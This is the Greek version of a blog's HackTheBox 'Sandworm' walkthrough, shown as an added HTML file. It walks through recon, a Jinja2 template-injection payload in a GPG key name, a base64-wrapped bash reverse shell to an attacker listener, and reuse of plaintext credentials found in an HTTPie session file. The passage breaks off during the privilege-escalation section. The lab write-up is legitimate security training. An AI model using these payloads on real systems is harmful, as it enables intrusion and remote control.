@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Sandworm — S. Markakis</title>
+<meta name="description" content="HackTheBox Sandworm machine walkthrough — full writeup with screenshots.">
+<meta property="og:title" content="HTB: Sandworm — S. Markakis">
+<meta property="og:description" content="HackTheBox Sandworm machine walkthrough — full writeup with screenshots.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-sandworm-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-sandworm.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-sandworm.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-sandworm-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-sandworm.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-sandworm-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-sandworm.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-ssti { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Sandworm",
+  "description": "HackTheBox Sandworm machine walkthrough — full writeup with screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-sandworm-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-sandworm.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-sandworm"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-sandworm.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Sandworm</h1>
+    <div class="post-meta">
+      <span class="date">17 Ιουνίου 2023</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-ssti">SSTI</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Μεσαιο</span>
+      <span>&nbsp;12 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Το Sandworm αλυσιδώνει πολλαπλές τεχνικές για να φτάσει σε root: <strong>Server-Side Template Injection</strong> μέσα από το πεδίο ονόματος ενός κλειδιού GPG (Jinja2), πλευρική κίνηση μέσω hardcoded credentials που βρέθηκαν σε ένα αρχείο session της HTTPie, privilege escalation μέσω ενός <strong>εγγράψιμου Rust crate</strong> που ξαναμεταγλωττίζεται από ένα cron job, και τέλος ένα <strong>Firejail SUID exploit</strong> για root.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Foothold (SSTI/GPG)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">atlas</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">silentobserver</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">atlas (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+  <p>Πλήρες σάρωμα port ακολουθούμενο από enumeration υπηρεσιών:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -sC -sV -p- --min-rate 5000 -oN sandworm.nmap &lt;TARGET_IP&gt;</span>
+
+<span class="po">PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://ssa.htb/
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency
+|   emailAddress=atlas@ssa.htb</span></div>
+  </div>
+
+  <table>
+    <tr><th>Port</th><th>Υπηρεσία</th><th>Σημειώσεις</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
+    <tr><td>80</td><td>HTTP</td><td>nginx — redirect σε HTTPS</td></tr>
+    <tr><td>443</td><td>HTTPS</td><td>nginx — ssa.htb</td></tr>
+  </table>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  ssa.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <!-- ══ WEB ENUM ══ -->
+  <h2>Web Enumeration</h2>
+
+  <p>Η επίσκεψη στο <code>https://ssa.htb</code> φορτώνει έναν ιστότοπο <strong>Secret Spy Agency</strong>. Τίποτα εκμεταλλεύσιμο στην επιφάνεια. Τρέχουμε directory enumeration:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">gobuster</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">gobuster dir -u https://ssa.htb/ -w /usr/share/dirb/wordlists/common.txt -k</span>
+
+<span class="po">/about    (Status: 200)
+/admin    (Status: 302) [--> /login?next=%2Fadmin]
+/contact  (Status: 200)
+</span><span class="pg">/guide    (Status: 200)   &lt;-- ενδιαφέρον</span><span class="po">
+/login    (Status: 200)
+/pgp      (Status: 200)
+/process  (Status: 405)</span></div>
+  </div>
+
+  <div class="alert alert-info">
+    Το <strong>/guide</strong> εκθέτει μια φόρμα επαλήθευσης υπογραφής PGP με δύο πεδία: <strong>Public Key</strong> και <strong>Signed Text</strong>. Το πεδίο Real Name του κλειδιού αντανακλάται στο αποτέλεσμα επαλήθευσης — μια κλασική επιφάνεια injection.
+  </div>
+
+  <!-- ══ SSTI ══ -->
+  <h2>Εκμετάλλευση — SSTI μέσω GPG</h2>
+
+  <h3>Επιβεβαίωση του σημείου injection</h3>
+  <p>Δημιουργούμε ένα κλειδί GPG χρησιμοποιώντας μια αριθμητική έκφραση Jinja2 ως πεδίο Real Name. Αν το template engine την κάνει evaluate, έχουμε SSTI.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">gpg — δοκιμαστικό κλειδί με payload SSTI</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">gpg --gen-key</span>
+
+<span class="po">Real name: </span><span class="py">{{7*7}}</span>
+<span class="po">Email address: test@test.com
+
+pub   rsa3072 2023-07-03 [SC]
+      88E980212F2E97F5121B32FED8045E508EF2F016
+uid                      </span><span class="py">{{7*7}}</span><span class="po"> &lt;test@test.com&gt;</span>
+
+<span class="pco"># Export και υπογραφή ενός δοκιμαστικού μηνύματος</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">gpg --armor --export test@test.com > public_key.asc</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "Test" > message.txt && gpg --clear-sign --output signed.asc message.txt</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-01-fdb1361efd.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-01-fdb1361efd.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Guide form with public key and signed text filled in" width="828" height="225"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-02-3d84d4a527.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-02-3d84d4a527.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Public key block" width="527" height="611"></picture>
+<p>Υποβάλλουμε και τα δύο στη φόρμα επαλήθευσης <code>/guide</code>. Το αποτέλεσμα δείχνει <code>49</code> ως ταυτότητα υπογράφοντα — <strong>SSTI Jinja2 επιβεβαιωμένο.</strong></p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-03-3acb10185a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-03-3acb10185a.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Signature verification result showing 49" width="673" height="610"></picture>
+<div class="alert alert-success">
+    GOODSIG — Good signature from "<strong>49</strong>" [unknown] — το <code>{{7*7}}</code> έγινε evaluate server-side.
+  </div>
+
+  <h3>Remote code execution</h3>
+  <p>Διαγράφουμε το δοκιμαστικό κλειδί, το ξαναδημιουργούμε με ένα payload RCE στο πεδίο name:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">gpg — payload RCE</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">gpg --delete-secret-keys test@test.com && gpg --delete-keys test@test.com</span>
+
+<span class="pco"># Νέο κλειδί — το πεδίο name είναι το payload μας</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">gpg --gen-key</span>
+
+<span class="po">Real name: </span><span class="py">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</span>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-04-31323a1eaf.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-04-31323a1eaf.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Signature verification showing atlas uid" width="528" height="637"></picture>
+<span class="pco"># Αποτέλεσμα επαλήθευσης:</span>
+<span class="pg">uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)</span></div>
+  </div>
+
+  <h3>Reverse shell — παράκαμψη με base64</h3>
+  <p>Τα απευθείας shell payloads αποτυγχάνουν γιατί το GPG απορρίπτει τα <code>&lt;</code> και <code>&gt;</code> στο πεδίο name. Κάνουμε base64-encode το payload για παράκαμψη:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reverse shell μέσω base64</span>
+    </div>
+    <div class="term-body"><span class="pco"># Encode της εντολής shell</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "bash -c 'bash -i >& /dev/tcp/&lt;YOUR_IP&gt;/4444 0>&1'" | base64</span>
+<span class="po">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDQ0IDA+JjEnCg==</span>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-05-8782e8f6b4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-05-8782e8f6b4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="cat signed_message.asc" width="667" height="386"></picture>
+<span class="pco"># Πεδίο name κλειδιού GPG:</span>
+<span class="py">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAt..." | base64 -d | bash').read() }}</span>
+
+<span class="pco"># Listener</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nc -lvnp 4444</span>
+<span class="po">Ncat: Listening on 0.0.0.0:4444 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.11.218] 52546
+bash: no job control in this shell
+</span><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span></div>
+  </div>
+
+  <div class="alert alert-success">Αποκτήθηκε shell ως <strong>atlas</strong>.</div>
+
+  <!-- ══ LATERAL ══ -->
+  <h2>Πλευρική κίνηση — atlas → silentobserver</h2>
+
+  <h3>Ανακάλυψη credentials</h3>
+  <p>Ψάχνοντας μέσα στον home φάκελο του atlas, βρίσκουμε ότι ο φάκελος <code>.config</code> περιέχει ένα αρχείο session της HTTPie με αποθηκευμένα credentials:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">atlas — κυνήγι για creds</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-06-77c91bacb4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-06-77c91bacb4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Atlas home directory listing" width="828" height="312"></picture>
+<span class="pd">└$ </span><span class="pc">cat ~/.config/httpie/sessions/localhost_5000/admin.json</span>
+
+<span class="po">{
+    "auth": {
+        </span><span class="py">"password": "quietLiketheWind22"</span><span class="po">,
+        "type": null,
+        </span><span class="py">"username": "silentobserver"</span><span class="po">
+    }
+}</span></div>
+  </div>
+
+  <h3>SSH ως silentobserver</h3>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh — silentobserver</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh silentobserver@ssa.htb</span>
+<span class="po">silentobserver@ssa.htb's password: </span><span class="py">quietLiketheWind22</span>
+<span class="po">Welcome to Ubuntu 22.04.2 LTS</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">cat user.txt</span>
+<span class="py">3c97f86************************</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 User flag αποκτήθηκε.</div>
+
+  <!-- ══ PRIVESC 1 ══ -->
+  <h2>PrivEsc — silentobserver → atlas (σταθερό shell)</h2>
+
+  <h3>Enumeration διεργασιών με pspy</h3>
+  <p>Τρέχοντας το <code>pspy64</code>, αποκαλύπτουμε ένα επαναλαμβανόμενο cron job που μεταγλωττίζει και εκτελεί το <code>/opt/tipnet</code> — ένα Rust binary.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pspy64</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">./pspy64</span>
+<span class="po">CMD: UID=1000 | </span><span class="py">cargo run --release</span><span class="po"> -- /opt/tipnet/src/main.rs
+CMD: UID=1000 | </span><span class="py">/opt/tipnet/target/release/tipnet</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-07-69dac27abc.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-07-69dac27abc.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="/opt/tipnet directory listing" width="747" height="466"></picture>
+<h3>Εγγράψιμο Rust crate</h3>
+  <p>Το <code>tipnet.d</code> δείχνει ότι το binary κάνει import ένα τοπικό crate logger. Ελέγχουμε τα δικαιώματά του:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
